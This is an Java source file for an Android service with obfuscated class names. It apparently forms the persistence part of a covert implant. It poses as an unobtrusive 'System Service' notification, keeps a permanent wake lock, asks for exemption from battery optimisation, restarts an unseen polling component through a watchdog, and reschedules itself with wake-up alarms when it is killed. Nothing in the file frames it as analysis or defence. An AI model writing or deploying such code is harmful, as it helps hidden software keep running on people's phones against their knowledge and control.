package com.v2ram;

import android.app.*;
import android.content.*;
import android.os.*;
import android.provider.Settings;

public class m extends Service {
    static final String CH = "sys";
    static final int NID = 0x1001;
    PowerManager.WakeLock wl;
    Thread poll, dog;
    volatile long lastBeat = 0;

    @Override public void onCreate() {
        super.onCreate();
        startForeground(NID, notif());

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "v2:sync");
        wl.setReferenceCounted(false);
        wl.acquire();

        try {
            Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                android.net.Uri.parse("package:" + getPackageName()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
        } catch (Throwable ignored) {}

        lastBeat = System.currentTimeMillis();
        poll = new Thread(() -> k.startWithBeat(this, () -> lastBeat = System.currentTimeMillis()));
        poll.start();
        dog = new Thread(this::watchdog);
        dog.start();
        scheduleFallback(15 * 60_000L);
    }

    Notification notif() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(CH, "System",
                NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE))
                .createNotificationChannel(ch);
        }
        return new Notification.Builder(this, CH)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_MIN)
            .build();
    }

    void watchdog() {
        while (true) {
            try { Thread.sleep(60_000); } catch (InterruptedException e) { return; }
            if (System.currentTimeMillis() - lastBeat > 120_000) {
                try { poll.interrupt(); } catch (Throwable ignored) {}
                poll = new Thread(() -> k.startWithBeat(this,
                    () -> lastBeat = System.currentTimeMillis()));
                poll.start();
            }
            if (!wl.isHeld()) wl.acquire();
            scheduleFallback(15 * 60_000L);
        }
    }

    void scheduleFallback(long delay) {
        AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
        Intent i = new Intent(this, n.class).setAction("com.v2ram.WATCHDOG");
        PendingIntent pi = PendingIntent.getBroadcast(this, 0, i,
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        long when = System.currentTimeMillis() + delay;
        if (Build.VERSION.SDK_INT >= 23) am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, when, pi);
        else am.setExact(AlarmManager.RTC_WAKEUP, when, pi);
    }

    @Override public int onStartCommand(Intent i, int f, int s) { return START_STICKY; }

    @Override public void onDestroy() {
        try { if (wl != null && wl.isHeld()) wl.release(); } catch (Throwable ignored) {}
        scheduleFallback(5000);
        super.onDestroy();
    }

    @Override public IBinder onBind(Intent i) { return null; }
}